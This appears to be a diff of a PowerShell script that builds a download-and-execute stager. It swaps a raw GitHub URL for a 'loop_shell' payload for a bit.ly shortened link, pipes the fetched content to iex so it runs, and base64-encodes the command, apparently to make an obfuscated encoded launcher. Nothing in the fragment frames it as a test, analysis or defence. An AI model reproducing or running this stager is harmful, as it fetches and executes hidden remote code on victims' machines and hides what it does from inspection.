@@ -1,4 +1,4 @@
-$command = 'iwr https://raw.githubusercontent.com/anaprivate/loop_shell/main/payload -UseBasicParsing | iex'
+$command = 'irm https://bit.ly/3Q9qej8 | iex'
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 [Convert]::ToBase64String($bytes)
 
